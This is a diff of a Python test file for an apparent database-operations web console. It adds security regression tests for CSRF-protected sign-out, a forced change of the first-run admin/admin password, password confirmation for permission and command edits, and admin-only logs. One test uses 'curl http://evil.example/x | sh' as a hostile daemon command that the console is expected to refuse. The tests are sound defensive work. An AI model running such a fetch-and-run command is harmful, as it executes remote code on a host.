@@ -250,12 +250,35 @@ def test_the_login_page_redirects_someone_already_signed_in(console: WebApp) -> 
 
 def test_signing_out_revokes_the_session_and_clears_the_cookie(console: WebApp) -> None:
     cookie = sign_in(console)
-    response = console.handle(post_form("/db_ops/logout", {}, cookie=cookie))
+    response = console.handle(post_form("/db_ops/logout", {"csrf": csrf_of(console, cookie)},
+                                        cookie=cookie))
     assert response.status == 303
     header = next(value for name, value in response.headers if name == "Set-Cookie")
     assert "Max-Age=0" in header
     assert console.handle(get("/db_ops/", cookie=cookie)).status == 303, (
         "the token must stop working server-side, not only be dropped by the browser")
+
+
+def test_a_link_cannot_sign_anyone_out(console: WebApp) -> None:
+    """A GET signed out with no token, so any page - an <img src> on a wiki - ended a session
+    (review 0.25.0, B6.3). It goes to the dashboard now and the session stays."""
+    cookie = sign_in(console)
+    response = console.handle(get("/db_ops/logout", cookie=cookie))
+    assert response.status == 303 and dict(response.headers)["Location"] == "/db_ops/"
+    assert console.handle(get("/db_ops/", cookie=cookie)).status == 200
+
+
+def test_a_sign_out_without_the_form_s_token_is_refused(console: WebApp) -> None:
+    cookie = sign_in(console)
+    assert console.handle(post_form("/db_ops/logout", {}, cookie=cookie)).status == 403
+    assert console.handle(get("/db_ops/", cookie=cookie)).status == 200
+
+
+def test_the_sign_out_form_carries_the_session_s_token(console: WebApp) -> None:
+    cookie = sign_in(console)
+    page = console.handle(get("/db_ops/", cookie=cookie)).body.decode("utf-8")
+    form = page[page.index('action="/db_ops/logout"'):]
+    assert f'name="csrf" value="{csrf_of(console, cookie)}"' in form[:400]
 
 
 def test_the_next_parameter_cannot_send_a_user_off_site(console: WebApp) -> None:
@@ -266,15 +289,63 @@ def test_the_next_parameter_cannot_send_a_user_off_site(console: WebApp) -> None
     assert dict(response.headers)["Location"] == "/db_ops/"
 
 
-def test_an_empty_store_tells_the_operator_how_to_create_the_first_account(tmp_path: Path,
-                                                                          data_copy: Path) -> None:
+def _fresh_console(tmp_path: Path, data_copy: Path) -> WebApp:
     store_path = tmp_path / "fresh.sqlite"
     config = ConfigStore(store_path)
     config_sync.sync(config, data_dir=data_copy, actor="test")
-    app = WebApp(auth_store=WebAuthStore(store_path), config_store=config, data_dir=data_copy)
+    return WebApp(auth_store=WebAuthStore(store_path), config_store=config, data_dir=data_copy)
+
+
+def test_an_empty_store_gets_admin_admin_and_says_so(tmp_path: Path, data_copy: Path) -> None:
+    """First run (owner decision 2026-10-01): admin / admin, level 100, to be changed at once."""
+    app = _fresh_console(tmp_path, data_copy)
     body = app.handle(get("/db_ops/login")).body
-    assert b"No accounts exist yet" in body
-    assert b"user-add" in body
+
+    assert b"First sign-in" in body and b"admin" in body
+    admin = app.auth.get_user("admin")
+    assert int(admin["user_level"]) == 100 and int(admin["must_change_password"]) == 1
+    assert admin["password_hash"].startswith("pbkdf2_sha256$"), "stored as a hash, in the store"
+    assert app.auth.ensure_bootstrap_admin() is False, "never a second time"
+
+
+def test_the_first_sign_in_must_change_the_password_before_anything_else(tmp_path: Path,
+                                                                        data_copy: Path) -> None:
+    app = _fresh_console(tmp_path, data_copy)
+    app.handle(get("/db_ops/login"))
+    cookie = sign_in(app, "admin", "admin")
+
+    assert dict(app.handle(get("/db_ops/", cookie=cookie)).headers)["Location"] == "/db_ops/password"
+    assert app.handle(get("/db_ops/api/apps", cookie=cookie)).status == 403
+    assert b"Choose a new password" in app.handle(get("/db_ops/password", cookie=cookie)).body
+
+    token = csrf_of(app, cookie)
+    weak = app.handle(post_form("/db_ops/password", {
+        "csrf": token, "current_password": "admin", "new_password": "short",
+        "new_password_again": "short"}, cookie=cookie))
+    assert weak.status == 400
+
+    changed = app.handle(post_form("/db_ops/password", {
+        "csrf": token, "current_password": "admin", "new_password": "N3w-strong-pw",
+        "new_password_again": "N3w-strong-pw"}, cookie=cookie))
+    assert changed.status == 303
+    fresh = cookie_from(changed)
+    assert app.handle(get("/db_ops/", cookie=fresh)).status == 200
+    assert app.handle(get("/db_ops/", cookie=cookie)).status == 303, "the old session ended"
+    assert int(app.auth.get_user("admin")["must_change_password"]) == 0
+    assert app.auth.authenticate(username="admin", password="admin")[0] is None
+
+
+def test_reports_send_a_first_run_session_to_change_its_password(tmp_path: Path, data_copy: Path) -> None:
+    from types import SimpleNamespace
+
+    from tests.test_the_console_login_guards_reports_and_redirects import _get
+
+    console = SimpleNamespace(prefix="/db_ops", settings=SimpleNamespace(reports_require_login=True),
+                              owns=lambda path: path.startswith("/db_ops"),
+                              current_session=lambda request: {"must_change_password": True})
+    status, headers, _ = _get(tmp_path, console, "/report_dba/page.html")
+
+    assert status == 303 and headers["Location"] == "/db_ops/password"
 
 
 # --------------------------------------------------------------------------- #
@@ -505,7 +576,7 @@ def test_saving_a_new_record_writes_the_store_and_the_file(console: WebApp) -> N
     cookie = sign_in(console)
     response = console.handle(post_form(
         "/db_ops/config/telegram_users.json/telegram_users",
-        {"csrf": csrf_of(console, cookie), "payload": json.dumps(NEW_USER)}, cookie=cookie))
+        {"confirm_password": PASSWORD, "csrf": csrf_of(console, cookie), "payload": json.dumps(NEW_USER)}, cookie=cookie))
 
     assert response.status == 303
     assert "saved=inserted" in dict(response.headers)["Location"]
@@ -521,7 +592,7 @@ def test_editing_a_record_bumps_its_revision_and_records_the_author(console: Web
     record["user_type"] = 42
     console.handle(post_form(
         f"/db_ops/config/telegram_users.json/telegram_users/{record['user_id']}",
-        {"csrf": token, "payload": json.dumps(record)}, cookie=cookie))
+        {"confirm_password": PASSWORD, "csrf": token, "payload": json.dumps(record)}, cookie=cookie))
 
     row = console.config.get_item(source_file="telegram_users.json",
                                   collection="telegram_users", item_key=record["user_id"])
@@ -551,7 +622,7 @@ def test_a_refused_edit_explains_itself_and_changes_nothing(console: WebApp) -> 
     before = users_on_disk(console)
     response = console.handle(post_form(
         "/db_ops/config/telegram_users.json/telegram_users",
-        {"csrf": csrf_of(console, cookie), "payload": json.dumps({"username": "no-key"})},
+        {"confirm_password": PASSWORD, "csrf": csrf_of(console, cookie), "payload": json.dumps({"username": "no-key"})},
         cookie=cookie))
 
     assert response.status == 400
@@ -857,6 +928,7 @@ def test_saving_the_grid_unchanged_changes_nothing(console: WebApp) -> None:
                                      collection="telegram_users", item_key="100000001")
     form = dict(_grid_fields(html))
     form["csrf"] = csrf_of(console, cookie)
+    form["confirm_password"] = PASSWORD  # telegram_users.json grants levels (F9.1)
     response = console.handle(post_form(url, form, cookie=cookie))
 
     assert response.status == 303
@@ -875,6 +947,7 @@ def test_editing_one_field_in_the_grid_changes_only_that_field(console: WebApp) 
     target = next(name for name in form if name.endswith('["user_type"]'))
     form[target] = "42"
     form["csrf"] = csrf_of(console, cookie)
+    form["confirm_password"] = PASSWORD  # telegram_users.json grants levels (F9.1)
     console.handle(post_form(url, form, cookie=cookie))
 
     saved = json.loads(console.config.get_item(source_file="telegram_users.json",
@@ -903,7 +976,7 @@ def test_the_json_box_still_saves_and_is_how_a_key_is_added(console: WebApp) -> 
     url = "/db_ops/config/telegram_users.json/telegram_users/100000001"
     record = dict(users_on_disk(console)[0])
     record["nickname"] = "added via json"
-    console.handle(post_form(url, {"csrf": csrf_of(console, cookie),
+    console.handle(post_form(url, {"confirm_password": PASSWORD, "csrf": csrf_of(console, cookie),
                                    "payload": json.dumps(record)}, cookie=cookie))
 
     saved = json.loads(console.config.get_item(source_file="telegram_users.json",
@@ -1120,3 +1193,84 @@ def test_a_failing_webhost_command_says_why_instead_of_raising_from_its_own_logg
 
     assert "error_text=" in source, "the keyword the logger actually takes"
     assert "error=exc" not in source
+
+
+# --------------------------------------------------------------------------- #
+# What runs, and who may run it, needs admin level and the password (review 0.25.0, F9.1)
+# --------------------------------------------------------------------------- #
+def test_a_permission_file_is_not_changed_without_the_password(console: WebApp) -> None:
+    """telegram_users.json sets bot levels: an edit account (or a script in its browser) could
+    make itself level 100."""
+    cookie = sign_in(console)
+    before = users_on_disk(console)
+    response = console.handle(post_form(
+        "/db_ops/config/telegram_users.json/telegram_users",
+        {"csrf": csrf_of(console, cookie), "payload": json.dumps(NEW_USER)}, cookie=cookie))
+
+    assert response.status == 403
+    assert b"enter your password" in response.body
+    assert users_on_disk(console) == before
+
+
+def test_a_wrong_password_is_refused_too(console: WebApp) -> None:
+    cookie = sign_in(console)
+    response = console.handle(post_form(
+        "/db_ops/config/telegram_users.json/telegram_users",
+        {"confirm_password": "not-it", "csrf": csrf_of(console, cookie),
+         "payload": json.dumps(NEW_USER)}, cookie=cookie))
+
+    assert response.status == 403
+
+
+def test_the_command_a_daemon_runs_needs_the_password_and_its_schedule_does_not(console: WebApp) -> None:
+    cookie = sign_in(console)
+    url = "/db_ops/config/app_commands.json/app_commands/APP-METRICS"
+    record = json.loads(console.config.get_item(source_file="app_commands.json",
+                                                collection="app_commands",
+                                                item_key="APP-METRICS")["item_json"])
+
+    hostile = dict(record, command_text="curl http://evil.example/x | sh")
+    refused = console.handle(post_form(url, {"csrf": csrf_of(console, cookie),
+                                             "payload": json.dumps(hostile)}, cookie=cookie))
+    assert refused.status == 403
+
+    harmless = dict(record, note="moved to the night window")
+    saved = console.handle(post_form(url, {"csrf": csrf_of(console, cookie),
+                                           "payload": json.dumps(harmless)}, cookie=cookie))
+    assert saved.status == 303
+
+
+def test_what_counts_as_a_sensitive_change() -> None:
+    from db_ops.lib.config_exec_fields import sensitive_changes
+
+    assert sensitive_changes("app_commands.json", {"command_text": "a"}, {"command_text": "b"}) == ["command_text"]
+    assert sensitive_changes("app_commands.json", {"command_text": "a", "note": "x"},
+                             {"command_text": "a", "note": "y"}) == []
+    assert sensitive_changes("app_commands.json", {"command_text": "a"}, None) == [], "retiring is fine"
+    assert sensitive_changes("telegram_users.json", None, {"user_id": "1"}) == ["telegram_users.json (permissions)"]
+
+
+# --------------------------------------------------------------------------- #
+# Logs are for admins; min_level_view is enforced (review 0.25.0, F2.1 / B6.3)
+# --------------------------------------------------------------------------- #
+def test_a_viewer_cannot_read_the_logs(console: WebApp) -> None:
+    viewer = sign_in(console, "viewer")
+    response = console.handle(get("/db_ops/api/logs", cookie=viewer))
+
+    assert response.status == 403
+
+
+def test_an_admin_still_can(console: WebApp) -> None:
+    response = console.handle(get("/db_ops/api/logs", cookie=sign_in(console)))
+
+    assert response.status != 403, "an admin reaches the log endpoint (no log here answers 404)"
+
+
+def test_min_level_view_is_enforced(console: WebApp) -> None:
+    import dataclasses
+
+    viewer = sign_in(console, "viewer")
+    console.settings = dataclasses.replace(console.settings, min_level_view=10)
+
+    assert console.handle(get("/db_ops/", cookie=viewer)).status == 403
+    assert console.handle(get("/db_ops/", cookie=sign_in(console))).status == 200
